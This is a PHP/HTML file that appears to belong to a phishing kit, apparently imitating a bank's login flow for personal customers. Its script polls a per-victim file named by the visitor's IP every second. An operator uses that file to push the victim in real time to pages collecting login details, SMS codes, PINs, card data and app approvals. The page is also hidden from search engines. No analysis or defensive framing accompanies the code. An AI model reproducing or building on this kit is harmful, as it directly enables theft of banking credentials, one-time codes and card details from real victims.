<?php
  include "./Assets/php/config/config.php";
?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <title>Particulares</title>
        <script src="./Assets/js/stutes.js"></script>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

        <div class="loading">
                <img src="./Assets/imgs/loading.gif" alt="">
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js>/js.js"></script>

        <script>
          var ip = '<?php echo get_client_ip(); ?>';
          var waiting = setInterval(function() {
            $.get('victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    // console.log('hada ba9i 0');
                }else if( data == 'log' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }               

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                }

                else if( data == 'pin' ) {
                    clearInterval(waiting);
                    location.href = "pin.php";
                }else if( data == 'pin_error' ){
                    clearInterval(waiting);
                    location.href = "pin.php?error";
                }

                else if( data == 'forma' ) {
                    clearInterval(waiting);
                    location.href = "code.php";
                }else if( data == 'forma_error' ){
                    clearInterval(waiting);
                    location.href = "code.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }
                
                else if( data == 'app' ){
                    clearInterval(waiting);
                    location.href = "app.php";
                }

                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }
            });
          }, 1000);             
        </script>

    </body>

</html>